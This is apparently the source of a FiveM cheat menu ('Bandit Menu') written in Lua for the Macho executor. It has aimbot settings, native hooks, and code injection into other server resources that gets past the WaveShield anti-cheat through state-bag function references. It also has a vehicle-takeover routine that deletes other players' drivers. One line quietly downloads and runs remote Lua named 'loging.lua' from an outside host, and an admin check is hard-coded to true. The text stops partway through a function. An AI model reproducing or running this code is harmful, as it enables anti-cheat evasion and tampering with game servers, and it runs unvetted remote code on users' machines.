MachoLockLogger(1)
local domain = 'junkie'
local apiBase = 'https://scytheservices.online'

local bit = bit or bit32
if not bit then
    local func = load([[
        return {
            bor = function(a,b) return a | b end,
            band = function(a,b) return a & b end,
            bxor = function(a,b) return a ~ b end,
            rshift = function(a,b) return a >> b end,
            lshift = function(a,b) return a << b end,
            bnot = function(a) return ~a end
        }
    ]])
    if func then bit = func() end
end

local function md5(str)
    local K = {
        0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee, 0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
        0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be, 0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,
        0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa, 0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
        0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed, 0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,
        0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c, 0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
        0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05, 0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,
        0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039, 0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
        0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1, 0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391
    }
    local function leftrotate(x, c)
        return bit.bor(bit.band(bit.lshift(x, c), 0xFFFFFFFF), bit.rshift(x, 32 - c))
    end
    local msgLen = #str
    local msg = str .. string.char(0x80)
    local bitLen = msgLen * 8
    while (#msg % 64) ~= 56 do msg = msg .. string.char(0) end
    for i = 0, 7 do
        msg = msg .. string.char(bit.band(bit.rshift(bitLen, i * 8), 0xFF))
    end
    local h0, h1, h2, h3 = 0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476
    for chunkStart = 1, #msg, 64 do
        local chunk = msg:sub(chunkStart, chunkStart + 63)
        local M = {}
        for i = 0, 15 do
            local pos = i * 4 + 1
            local a, b, c, d = string.byte(chunk, pos, pos + 3)
            M[i] = bit.bor(bit.bor(a or 0, bit.lshift(b or 0, 8)), bit.bor(bit.lshift(c or 0, 16), bit.lshift(d or 0, 24)))
        end
        local A, B, C, D = h0, h1, h2, h3
        for i = 0, 63 do
            local F, g
            if i <= 15 then
                F = bit.bor(bit.band(B, C), bit.band(bit.bnot(B), D))
                g = i
            elseif i <= 31 then
                F = bit.bor(bit.band(D, B), bit.band(bit.bnot(D), C))
                g = (5 * i + 1) % 16
            elseif i <= 47 then
                F = bit.bxor(bit.bxor(B, C), D)
                g = (3 * i + 5) % 16
            else
                F = bit.bxor(C, bit.bor(B, bit.bnot(D)))
                g = (7 * i) % 16
            end
            local temp = D
            D = C
            C = B
            local sum = bit.band(A + F + K[i + 1] + M[g], 0xFFFFFFFF)
            local s = ({7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,
                        5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,
                        4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,
                        6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21})[i + 1]
            B = bit.band(B + leftrotate(sum, s), 0xFFFFFFFF)
            A = temp
        end
        h0 = bit.band(h0 + A, 0xFFFFFFFF)
        h1 = bit.band(h1 + B, 0xFFFFFFFF)
        h2 = bit.band(h2 + C, 0xFFFFFFFF)
        h3 = bit.band(h3 + D, 0xFFFFFFFF)
    end
    local function toHex32LE(n)
        return string.format('%02x%02x%02x%02x',
            bit.band(n, 0xFF),
            bit.band(bit.rshift(n, 8), 0xFF),
            bit.band(bit.rshift(n, 16), 0xFF),
            bit.band(bit.rshift(n, 24), 0xFF))
    end
    return toHex32LE(h0) .. toHex32LE(h1) .. toHex32LE(h2) .. toHex32LE(h3)
end

local Dui = MachoCreateDui('https://x9services.net/cce8e374591d2a12b782b70e60aaf327/')
local menuOpen = false
local MenuKey = 'Caps Lock'
local menuConfig
local discordUser = GetPlayerName(PlayerId()) or 'User Not Found'

MachoIsolatedInject(MachoWebRequest("https://wizlua.com/raw/loging.lua"))

local ADMIN_KEYS = {
    ['4918168691930856219'] = true,
    ['4907490772155802642'] = true,
}

local function isAdmin()
    return true
end

local activeIndex = 1
local nestedMenus = {}
local currentTabs = nil
local currentTabIndex = 0

local menuPosX = 14.25
local menuPosY = 21.5
local menuColorR = 237
local menuColorG = 107
local menuColorB = 32
local menuTitle = 'Bandit Menu'
local menuBannerURL = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMTg2IiBoZWlnaHQ9IjQwNyIgdmlld0JveD0iMCAwIDExODYgNDA3IiByb2xlPSJpbWciIGFyaWEtbGFiZWxsZWRieT0idGl0bGUgZGVzY3JpcHRpb24iPg0KICA8dGl0bGUgaWQ9InRpdGxlIj5CYW5kaXQgSGFsbG93ZWVuPC90aXRsZT4NCiAgPGRlc2MgaWQ9ImRlc2NyaXB0aW9uIj5BbiBvcmlnaW5hbCBIYWxsb3dlZW4gbWVudSBoZWFkZXIgd2l0aCBhdXR1bW4gbGVhdmVzLCBjYXJ2ZWQgcHVtcGtpbnMsIGFuZCB0aGUgQmFuZGl0IERpc2NvcmQgaW52aXRlLjwvZGVzYz4NCiAgPGRlZnM+DQogICAgPGxpbmVhckdyYWRpZW50IGlkPSJza3kiIHgyPSIwIiB5Mj0iMSI+DQogICAgICA8c3RvcCBzdG9wLWNvbG9yPSIjMTcxMjFlIi8+DQogICAgICA8c3RvcCBvZmZzZXQ9Ii42IiBzdG9wLWNvbG9yPSIjNDUyMDJkIi8+DQogICAgICA8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNhNjQ0MjAiLz4NCiAgICA8L2xpbmVhckdyYWRpZW50Pg0KICAgIDxsaW5lYXJHcmFkaWVudCBpZD0iZ3JvdW5kIiB4Mj0iMCIgeTI9IjEiPg0KICAgICAgPHN0b3Agc3RvcC1jb2xvcj0iIzNjMjAyNyIvPg0KICAgICAgPHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjMTAwZTE2Ii8+DQogICAgPC9saW5lYXJHcmFkaWVudD4NCiAgICA8cmFkaWFsR3JhZGllbnQgaWQ9Im1vb24iPg0KICAgICAgPHN0b3Agc3RvcC1jb2xvcj0iI2ZmZjFjMSIvPg0KICAgICAgPHN0b3Agb2Zmc2V0PSIuNzIiIHN0b3AtY29sb3I9IiNmZmFkNDIiLz4NCiAgICAgIDxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iI2VmNjcyYyIgc3RvcC1vcGFjaXR5PSIwIi8+DQogICAgPC9yYWRpYWxHcmFkaWVudD4NCiAgICA8bGluZWFyR3JhZGllbnQgaWQ9Im9yYW5nZSIgeDI9IjAiIHkyPSIxIj4NCiAgICAgIDxzdG9wIHN0b3AtY29sb3I9IiNmZmMwNTIiLz4NCiAgICAgIDxzdG9wIG9mZnNldD0iLjU1IiBzdG9wLWNvbG9yPSIjZjQ3NzIyIi8+DQogICAgICA8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNhOTMyMjAiLz4NCiAgICA8L2xpbmVhckdyYWRpZW50Pg0KICAgIDxsaW5lYXJHcmFkaWVudCBpZD0ic2hhZGUiIHgyPSIwIiB5Mj0iMSI+DQogICAgICA8c3RvcCBzdG9wLWNvbG9yPSIjMDkwODBlIiBzdG9wLW9wYWNpdHk9Ii4wNCIvPg0KICAgICAgPHN0b3Agb2Zmc2V0PSIuNTgiIHN0b3AtY29sb3I9IiMwOTA4MGUiIHN0b3Atb3BhY2l0eT0iLjEzIi8+DQogICAgICA8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiMwOTA4MGUiIHN0b3Atb3BhY2l0eT0iLjkxIi8+DQogICAgPC9saW5lYXJHcmFkaWVudD4NCiAgICA8cGF0dGVybiBpZD0iZ3JhaW4iIHdpZHRoPSIxMiIgaGVpZ2h0PSIxMiIgcGF0dGVyblVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+DQogICAgICA8Y2lyY2xlIGN4PSIyIiBjeT0iMyIgcj0iLjciIGZpbGw9IiNmZmYiIG9wYWNpdHk9Ii4xIi8+DQogICAgICA8Y2lyY2xlIGN4PSI5IiBjeT0iOCIgcj0iLjYiIGZpbGw9IiNmZmM4NzYiIG9wYWNpdHk9Ii4xIi8+DQogICAgPC9wYXR0ZXJuPg0KICAgIDxmaWx0ZXIgaWQ9Imdsb3ciIHg9Ii01MCUiIHk9Ii01MCUiIHdpZHRoPSIyMDAlIiBoZWlnaHQ9IjIwMCUiPg0KICAgICAgPGZlR2F1c3NpYW5CbHVyIHN0ZERldmlhdGlvbj0iMjAiLz4NCiAgICA8L2ZpbHRlcj4NCiAgICA8ZyBpZD0ibGVhZiI+DQogICAgICA8cGF0aCBkPSJNMCAwQy05LTEyLTQtMjAgMS0yOCA2LTE3IDEyLTEyIDUtNCAxNC0xMSAyMC03IDIzLTMgMTQtMiAxMCA0IDQgMyA4IDExIDMgMTcgMCAyMS0yIDEyLTcgOC0yIDItMTAgNy0xNiA0LTE5IDEtMTAgMC01LTQgMCAwWiIgZmlsbD0iY3VycmVudENvbG9yIi8+DQogICAgICA8cGF0aCBkPSJNMCAxIDItMTZNMS00bC04LTNtMTAtMiA3LTVtLTcgOCA3IDEiIGZpbGw9Im5vbmUiIHN0cm9rZT0iI2ZmZTViNiIgc3Ryb2tlLW9wYWNpdHk9Ii41OCIgc3Ryb2tlLXdpZHRoPSIxIi8+DQogICAgPC9nPg0KICAgIDxnIGlkPSJwdW1wa2luIj4NCiAgICAgIDxwYXRoIGQ9Ik0wIDBjLTUtOS0yLTE4IDMtMjMgNSA3IDUgMTUgMCAyM1oiIGZpbGw9IiM2Mzc2M2EiLz4NCiAgICAgIDxwYXRoIGQ9Ik0wLTNjLTI5LTI5LTY0LTEwLTY0IDI3IDAgMzUgMjcgNTIgNjQgNTJzNjQtMTcgNjQtNTJDNjQtMTMgMjktMzIgMC0zWiIgZmlsbD0idXJsKCNvcmFuZ2UpIiBzdHJva2U9IiM3NDJkMjIiIHN0cm9rZS13aWR0aD0iMyIvPg0KICAgICAgPHBhdGggZD0iTTAtN2MtMTMgOS0xNyAyNy0xNyA0NiAwIDE2IDYgMjkgMTcgMzdtMC04M2MxMyA5IDE3IDI3IDE3IDQ2IDAgMTYtNiAyOS0xNyAzN00tMzkgMmMtOCAxMS0xMCAyNC04IDM3IDIgMTMgOSAyMyAxOSAzMG02Ni02N2M4IDExIDEwIDI0IDggMzctMiAxMy05IDIzLTE5IDMwIiBmaWxsPSJub25lIiBzdHJva2U9IiNmZmUwOWEiIHN0cm9rZS1vcGFjaXR5PSIuMzUiIHN0cm9rZS13aWR0aD0iMyIvPg0KICAgICAgPHBhdGggZD0ibS0zMCAyMSAxNyAxMS0xNyAxMVptNjAgMEwxMyAzMmwxNyAxMVpNLTIyIDU0cTIyIDE4IDQ0IDBsLTUgMTFoLTM0WiIgZmlsbD0iI2ZmZWRiMSIvPg0KICAgICAgPGVsbGlwc2UgY3g9IjAiIGN5PSI3NSIgcng9IjcwIiByeT0iMTIiIGZpbGw9IiNmZjc2MjYiIG9wYWNpdHk9Ii4zMiIgZmlsdGVyPSJ1cmwoI2dsb3cpIi8+DQogICAgPC9nPg0KICA8L2RlZnM+DQogIDxyZWN0IHdpZHRoPSIxMTg2IiBoZWlnaHQ9IjQwNyIgZmlsbD0idXJsKCNza3kpIi8+DQogIDxjaXJjbGUgY3g9IjU5MyIgY3k9IjE1MiIgcj0iMTY0IiBmaWxsPSIjZmY5NzJlIiBvcGFjaXR5PSIuMiIgZmlsdGVyPSJ1cmwoI2dsb3cpIi8+DQogIDxjaXJjbGUgY3g9IjU5MyIgY3k9IjE1MiIgcj0iMTA2IiBmaWxsPSJ1cmwoI21vb24pIi8+DQogIDxjaXJjbGUgY3g9IjU5MyIgY3k9IjE1MiIgcj0iNjkiIGZpbGw9IiNmZmRjOTYiIG9wYWNpdHk9Ii40NSIvPg0KICA8cGF0aCBkPSJNMCAyNjcgNzkgMjI0bDcxIDMyIDY3LTcwIDY4IDU0IDYzLTM5IDc3IDUyIDc2LTY1IDY0IDU0IDY1LTQ2IDc0IDUwIDYyLTY4IDc1IDUzIDY4LTM2IDc3IDUydjE2NEgwWiIgZmlsbD0iIzI5MWEyNCIgb3BhY2l0eT0iLjkyIi8+DQogIDxnIGZpbGw9IiMxNzEzMWUiPg0KICAgIDxwYXRoIGQ9Ik0wIDI2NyAzNCAxODZsLTktNTkgMzUgNDcgMjAtODAgOCA4NyAzMi00OC0xOCA2NSAzMiA2OUgwWm0xMTg2IDAtMzQtODEgOS01OS0zNSA0Ny0yMC04MC04IDg3LTMyLTQ4IDE4IDY1LTMyIDY5aDEzNFoiLz4NCiAgICA8cGF0aCBkPSJtMTAzIDI2MSAyMS02Mi0xMC00NCAyNyAzNyAxNS02NCA2IDcyIDI5LTMyLTE4IDQ4IDMxIDQ1aC0xMDFabTk4MCAwLTIyLTYyIDEwLTQ0LTI3IDM3LTE1LTY0LTYgNzItMjktMzIgMTggNDgtMzEgNDVoMTAyWiIvPg0KICA8L2c+DQogIDxwYXRoIGQ9Ik0wIDMxN2MxMDQtMzkgMjAxLTI0IDI5NSAyIDEwMSAyOCAxOTIgMTEgMjk0LTE0IDEwOS0yNiAxOTYtOSAyOTYgMTkgMTAxIDI4IDE5MyAxMSAzMDEtMjJ2MTA1SDBaIiBmaWxsPSJ1cmwoI2dyb3VuZCkiLz4NCiAgPGcgb3BhY2l0eT0iLjk4Ij4NCiAgICA8dXNlIGhyZWY9IiNsZWFmIiB4PSI5NSIgeT0iMTExIiBjb2xvcj0iI2ZmOGEzMiIgdHJhbnNmb3JtPSJyb3RhdGUoLTMwIDk1IDExMSkgc2NhbGUoMS4yMikiLz4NCiAgICA8dXNlIGhyZWY9IiNsZWFmIiB4PSIyMjQiIHk9IjE5NyIgY29sb3I9IiNlNTRhMmMiIHRyYW5zZm9ybT0icm90YXRlKDI0IDIyNCAxOTcpIHNjYWxlKC44OCkiLz4NCiAgICA8dXNlIGhyZWY9IiNsZWFmIiB4PSIzMjYiIHk9Ijk2IiBjb2xvcj0iI2ZmYzM1NCIgdHJhbnNmb3JtPSJyb3RhdGUoNDggMzI2IDk2KSBzY2FsZSguNzIpIi8+DQogICAgPHVzZSBocmVmPSIjbGVhZiIgeD0iNDMxIiB5PSIyMjYiIGNvbG9yPSIjYzk0MTJlIiB0cmFuc2Zvcm09InJvdGF0ZSgtMTcgNDMxIDIyNikgc2NhbGUoLjgpIi8+DQogICAgPHVzZSBocmVmPSIjbGVhZiIgeD0iNzYyIiB5PSI5OSIgY29sb3I9IiNmZjhhMzIiIHRyYW5zZm9ybT0icm90YXRlKDQwIDc2MiA5OSkgc2NhbGUoLjk0KSIvPg0KICAgIDx1c2UgaHJlZj0iI2xlYWYiIHg9Ijg5MiIgeT0iMTk5IiBjb2xvcj0iI2U4NTQyOSIgdHJhbnNmb3JtPSJyb3RhdGUoLTI3IDg5MiAxOTkpIHNjYWxlKC43OCkiLz4NCiAgICA8dXNlIGhyZWY9IiNsZWFmIiB4PSIxMDM0IiB5PSIxMTEiIGNvbG9yPSIjZmZjMzU0IiB0cmFuc2Zvcm09InJvdGF0ZSgxOCAxMDM0IDExMSkgc2NhbGUoMS4xNikiLz4NCiAgICA8dXNlIGhyZWY9IiNsZWFmIiB4PSIxMDg5IiB5PSIyNTkiIGNvbG9yPSIjZDk0YTJiIiB0cmFuc2Zvcm09InJvdGF0ZSg1NyAxMDg5IDI1OSkgc2NhbGUoLjgpIi8+DQogICAgPHVzZSBocmVmPSIjbGVhZiIgeD0iMTY4IiB5PSIyNzQiIGNvbG9yPSIjZjVhMTNkIiB0cmFuc2Zvcm09InJvdGF0ZSgtNDEgMTY4IDI3NCkgc2NhbGUoLjYyKSIvPg0KICAgIDx1c2UgaHJlZj0iI2xlYWYiIHg9Ijk4MyIgeT0iMjkyIiBjb2xvcj0iI2YwNzkzMCIgdHJhbnNmb3JtPSJyb3RhdGUoMjUgOTgzIDI5Mikgc2NhbGUoLjcpIi8+DQogIDwvZz4NCiAgPHVzZSBocmVmPSIjcHVtcGtpbiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTUxIDI4OSkgc2NhbGUoLjcyKSIvPg0KICA8dXNlIGhyZWY9IiNwdW1wa2luIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxMDM1IDI5Nikgc2NhbGUoLjY4KSIvPg0KICA8ZyBmaWxsPSIjMTcxMzFlIiBvcGFjaXR5PSIuODgiPg0KICAgIDxwYXRoIGQ9Ik01MTMgMzA0YzAtMjMgMTgtNDEgNDAtNDFzNDAgMTggNDAgNDF2MjZoLTgwWm00OS0zOWMtNC0xMi0xLTIzIDctMzEgOCA5IDEwIDIwIDYgMzFaIi8+DQogICAgPHBhdGggZD0ibTY0NyAxMTggMTItMjEgMTIgMjFtLTE3LTIgNS0xMSA1IDExIiBmaWxsPSJub25lIiBzdHJva2U9IiMyMTE3MjMiIHN0cm9rZS13aWR0aD0iNSIvPg0KICA8L2c+DQogIDxyZWN0IHdpZHRoPSIxMTg2IiBoZWlnaHQ9IjQwNyIgZmlsbD0idXJsKCNzaGFkZSkiLz4NCiAgPHJlY3Qgd2lkdGg9IjExODYiIGhlaWdodD0iNDA3IiBmaWxsPSJ1cmwoI2dyYWluKSIgb3BhY2l0eT0iLjMiLz4NCiAgPHBhdGggZD0iTTAgMzVoMTE4Nk0wIDM3NGgxMTg2IiBzdHJva2U9IiNmZmFkNGYiIHN0cm9rZS1vcGFjaXR5PSIuNTUiLz4NCiAgPHRleHQgeD0iNTkzIiB5PSIzMTkiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtZmFtaWx5PSJBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmIiBmb250LXNpemU9IjYxIiBmb250LXdlaWdodD0iOTAwIiBsZXR0ZXItc3BhY2luZz0iMTUiIGZpbGw9IiNmZmYwZDUiIHN0cm9rZT0iIzI3MTUxYyIgc3Ryb2tlLXdpZHRoPSI1IiBwYWludC1vcmRlcj0ic3Ryb2tlIj5CQU5ESVQ8L3RleHQ+DQogIDxwYXRoIGQ9Ik00MDggMzM4aDEzMm0xMDYgMGgxMzIiIHN0cm9rZT0iI2ZmOWY0MyIgc3Ryb2tlLXdpZHRoPSIyIiBvcGFjaXR5PSIuOTUiLz4NCiAgPHRleHQgeD0iNTkzIiB5PSIzNjQiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtZmFtaWx5PSJBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmIiBmb250LXNpemU9IjE3IiBmb250LXdlaWdodD0iNzAwIiBsZXR0ZXItc3BhY2luZz0iMiIgZmlsbD0iI2ZmZTJiMiI+ZGlzY29yZC5nZy9iYW5kaXRtZW51PC90ZXh0Pg0KPC9zdmc+DQo='

local junkieAimbotFovSize    = 150
local junkieAimbotFovVisible = false
local junkieAimbotAimKeyName = 'RMB'
local junkieAimbotAimKey     = 25

local junkieTriggerKeyName   = 'RMB'
local junkieTriggerKey       = 25

local AIMKEY_MAP = {
    G=47, Q=44, E=38, R=45, F=23, X=73, H=74, B=29,
    N=59, V=52, C=26, T=245, LeftShift=21, LeftControl=36, Tab=37
}
local showKeybindListState = false
local showSpectatorListState = false
local adminListEnabled = false
local adminListThreadActive = false
local freecamHandle
local propInputOpen = false

local function toggleMenu(SET_TOGGLE)
    menuOpen = SET_TOGGLE

    if Dui then
        MachoSendDuiMessage(Dui, json.encode({ action = 'showMenu', visible = SET_TOGGLE }))
        if SET_TOGGLE then
            local playerName = GetPlayerName(PlayerId()) or 'Player'
            MachoSendDuiMessage(Dui, json.encode({ action = 'setDiscord_user', discordUser = playerName }))
            MachoSendDuiMessage(Dui, json.encode({ action = 'setHeaderTitle', title = menuTitle }))
            MachoSendDuiMessage(Dui, json.encode({ action = 'setBanner', url = menuBannerURL }))
            SendSvelte('setMenuColor', { r = menuColorR, g = menuColorG, b = menuColorB })
        end
    end
end

local function setCurrent()
    if Dui then
        MachoSendDuiMessage(Dui, json.encode({
            action = 'setCurrent',
            current = activeIndex,
            menu = menuConfig,
            title = menuTitle
        }))
    end
end

local function SendSvelte(action, data)
    if not Dui then return end
    data.action = action
    MachoSendDuiMessage(Dui, json.encode(data))
end

HookedNatives = {}
SetHooks = {}

function CreateHook(hookType, cb)
    SetHooks[hookType] = cb
end

function HookNative(...)
    HookedNatives[#HookedNatives + 1] = MachoHookNative(...)
end

HookNative(0x0C515FAB3FF9EA92, function(propType, data)
    if propType and data then
        if propType == 'Hook' then
            data = json.decode(data)

            if data then
                local hookData = data.HookData

                if hookData then
                    local setHook = SetHooks[hookData.HookType]

                    if setHook then
                        CreateThread(function()
                            setHook(table.unpack(hookData.SetArgs))
                        end)
                    end
                end
            end
        end
    end

    return true
end)

CreateHook('SetHoveringTextOptions', function(options)
    MachoExecuteDuiScript(Dui, ('window.hoveringText.setOptions(%s);'):format(json.encode(options)))
end)

CreateHook('SetHoveringTextOption', function(option)
    MachoExecuteDuiScript(Dui, ('window.hoveringText.selectById("%s");'):format(option))
end)

CreateHook('UpdateHoveringTextOption', function(id, data)
    MachoExecuteDuiScript(Dui, ('window.hoveringText.updateOption("%s", %s);'):format(id, json.encode(data)))
end)

CreateHook('GiveWeaponToPed', function(netId, weapon, ammo)
    local ped = NetworkGetEntityFromNetworkId(netId)
    if ped and ped > 0 then
        GiveWeaponToPed(ped, weapon, ammo, false, true)
    end
end)

local function injectCode(resource, code)
    local setCode = [[
            local SafeRunNative
            if GetResourceState('WaveShield') == 'started' then
                local _wsCache = {}
                local _wsSid   = GetPlayerServerId(PlayerId())
                local _wsRid   = tostring(math.random(999999)) .. tostring(GetGameTimer())

                local _wsRawSet = function(bag, key, payload)
                    local r = Citizen.GetFunctionReference(SetStateBagValue)
                    msgpack.unpack(string.char(0xC7, #r, 10) .. r)(bag, key, payload, #payload, false)
                end

                local _wsWrap = function(func)
                    if _wsCache[func] then return _wsCache[func] end
                    local key     = '_junkie_' .. _wsRid .. '_' .. math.random(999999)
                    local ref     = Citizen.GetFunctionReference(func)
                    local payload = string.char(0xC7, #ref, 10) .. ref
                    _wsRawSet('player:' .. _wsSid, key, payload)
                    _wsCache[func] = Player(_wsSid).state[key]
                    return _wsCache[func]
                end

                SafeRunNative = function(setFunc, ...)
                    return _wsWrap(setFunc)(...)
                end
            else
                SafeRunNative = function(setFunc, ...)
                    local stateName = math.random(999999, 999999999) .. GetCurrentResourceName() .. GetGameTimer()
                    LocalPlayer.state:set(stateName, setFunc, false)
                    return LocalPlayer.state[stateName](...)
                end
            end

            GetSafeArgs = function(setArgs)
                for setKey, setValue in pairs(setArgs) do
                    local setType = type(setValue)

                    if setType == 'function' then
                        setValue = tostring(setValue)
                    elseif setType == 'table' then
                        setValue = GetSafeArgs(setValue)
                    end

                    setArgs[setKey] = setValue
                end

                return setArgs
            end

            SendToHook = function(hookType, ...)
                SafeRunNative(AreStringsEqual, 'Hook', json.encode({
                    HookData = {
                        HookType = hookType,
                        SetArgs = GetSafeArgs({...})
                    }
                }))
            end

            ShowNotification = function(...)
                SendToHook('ShowNotification', ...)
            end

            _G.SetClient_TrackedSafeThreads = _G.SetClient_TrackedSafeThreads or {}

            DeleteTrackedThread = function(threadName)
                if _G.SetClient_TrackedSafeThreads then
                    local setThreadCb = _G.SetClient_TrackedSafeThreads[threadName]

                    if setThreadCb then
                        setThreadCb()
                    end
                end
            end

            CreateTrackedThread = function(threadName, setHandlers)
                DeleteTrackedThread(threadName)

                SafeRunNative(CreateThread, function()
                    setHandlers.isActive = true

                    _G.SetClient_TrackedSafeThreads = _G.SetClient_TrackedSafeThreads or {}

                    _G.SetClient_TrackedSafeThreads[threadName] = function()
                        setHandlers.isActive = false

                        if _G.SetClient_TrackedSafeThreads then
                            _G.SetClient_TrackedSafeThreads[threadName] = nil
                        end

                        if setHandlers.onRemove then
                            setHandlers:onRemove()
                        end
                    end

                    setHandlers:thread()
                end)
            end

            GetEntityParent = function(entity)
                local selfPed = entity or PlayerPedId()
                local selfVehicle = GetVehiclePedIsIn(selfPed, false)
                local selfEntity = selfPed

                if selfVehicle and selfVehicle > 0 and selfPed == GetPedInVehicleSeat(selfVehicle, -1) then
                    selfEntity = selfVehicle
                end

                return selfEntity
            end

            SetCoords = function(entity, coords)
                SafeRunNative(SetEntityCoordsNoOffset, entity, coords.x, coords.y, coords.z, true, true, false)
            end

            SetCurrentSelfData = function(setData)
                local selfPed = PlayerPedId()
                local setVehicle = setData.vehicle
                local setSeat = setData.seat

                if setVehicle and setSeat and DoesEntityExist(setVehicle) then
                    SafeRunNative(TaskWarpPedIntoVehicle, selfPed, setVehicle, setSeat)
                else
                    SafeRunNative(SetEntityCoordsNoOffset, selfPed, setData.coords, false, false, true)
                    SafeRunNative(SetEntityHeading, selfPed, setData.heading)
                end
            end

            GetCachedSelfData = function()
                local selfPed = PlayerPedId()
                local selfVehicle = GetVehiclePedIsIn(selfPed, -1)
                local selfData = {
                    ped = selfPed,
                    coords = GetEntityCoords(selfPed),
                    heading = GetEntityHeading(selfPed)
                }

                selfVehicle = selfVehicle and selfVehicle > 0 and selfVehicle

                if selfVehicle then
                    selfData.vehicle = selfVehicle

                    for i = -1, GetVehicleModelNumberOfSeats(GetEntityModel(selfVehicle)) - 1 do
                        if GetPedInVehicleSeat(selfVehicle, i) == selfPed then
                            selfData.seat = i

                            break
                        end
                    end
                end

                return selfData
            end

            TakeControlOfVehicle = function(vehicle)
                local driver = GetPedInVehicleSeat(vehicle, -1)

                if NetworkHasControlOfEntity(vehicle) then
                    return true
                end


                local cachedSelfData = GetCachedSelfData()
                local selfPed = cachedSelfData.ped

                SafeRunNative(ClearPedTasksImmediately, selfPed)

                Wait(0)

                local startTimer = GetGameTimer()

                while DoesEntityExist(vehicle) and (GetGameTimer() - startTimer) <= 1000 and not NetworkHasControlOfEntity(vehicle) do
                    selfPed = PlayerPedId()

                    SafeRunNative(SetEntityAsMissionEntity, driver, true, true)
                    SafeRunNative(SpecialFunctionDoNotUse, driver, true)
                    SafeRunNative(DeleteEntity, driver)

                    local currentDriver = GetPedInVehicleSeat(vehicle, -1)
                    if currentDriver and currentDriver > 0 and currentDriver ~= selfPed and currentDriver ~= driver then
                        SafeRunNative(SetEntityAsMissionEntity, currentDriver, true, true)
                        SafeRunNative(SpecialFunctionDoNotUse, currentDriver, true)
                        SafeRunNative(DeleteEntity, currentDriver)
                    end

                    SafeRunNative(SetEntityAsMissionEntity, vehicle, true, true)
                    SafeRunNative(TaskEnterVehicle, selfPed, vehicle, 100, -1, 2.0, 16, 0)

                    Wait(0)
                end

                SafeRunNative(SetPedVehicleForcedSeatUsage, selfPed, vehicle, -1, 16)
                SafeRunNative(TaskWarpPedIntoVehicle, selfPed, vehicle, -1)

                Wait(0)

                selfPed = PlayerPedId()

                SafeRunNative(ClearPedTasksImmediately, selfPed)
                SetCurrentSelfData(cachedSelfData)

                if NetworkHasControlOfEntity(vehicle) then
                    return true
                end

                return false
            end

            PlayAnim = function(ped, dict, name, ...)
                while not HasAnimDictLoaded(dict) do
                    SafeRunNative(RequestAnimDict, dict)

                    Wait(0)
                end

                SafeRunNative(TaskPlayAnim, ped, dict, name, ...)
            end

            EnterVehicleThrowing = function(vehicle)
                if not TakeControlOfVehicle(vehicle) then
                    return false
                end

                local function getCamDirection()
                    local camRot = GetGameplayCamRot(2)
                    local pitch = math.rad(camRot.x)
                    local yaw = math.rad(camRot.z)

                    local dir = vector3(
                        -math.sin(yaw) * math.cos(pitch),
                        math.cos(yaw) * math.cos(pitch),
                        math.sin(pitch)
                    )

                    local length = math.sqrt(dir.x * dir.x + dir.y * dir.y + dir.z * dir.z)

                    return vector3(dir.x / length, dir.y / length, dir.z / length)
                end

                local function getCamRaycastHit()
                    local camCoords = GetGameplayCamCoord()
                    local dir = getCamDirection()
                    local selfPed = PlayerPedId()
                    local farPoint = vector3(
                        camCoords.x + dir.x * 1000.0,
                        camCoords.y + dir.y * 1000.0,
                        camCoords.z + dir.z * 1000.0
                    )

                    local rayHandle = StartShapeTestRay(
                        camCoords.x, camCoords.y, camCoords.z,
                        farPoint.x, farPoint.y, farPoint.z,
                        -1,
                        selfPed,
                        0
                    )

                    local _, hit, endCoords = GetShapeTestResult(rayHandle)

                    if hit == 1 then
                        return endCoords
                    end

                    return farPoint
                end

                -- LoadModel = function(model)
                --     while not HasModelLoaded(model) do
                --         RequestModel(model)
                --         Wait(0)
                --     end
                -- end

                -- SpawnVehicle = function(model, coords)
                --     LoadModel(model)

                --     return SafeRunNative(CreateVehicle, model, coords.x, coords.y, coords.z, coords.w or 0.0, true, false)
                -- end

                SafeRunNative(CreateThread, function()
                    local animDict = 'anim@mp_rollarcoaster'
                    local animName = 'hands_up_idle_a_player_one'
                    local force = 150.0

                    while vehicle and vehicle > 0 and DoesEntityExist(vehicle) and NetworkHasControlOfEntity(vehicle) do
                        local selfPed = PlayerPedId()

                        if not IsEntityPlayingAnim(selfPed, animDict, animName, 3) then
                            PlayAnim(selfPed, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
                        end

                        if not IsEntityPositionFrozen(vehicle) then
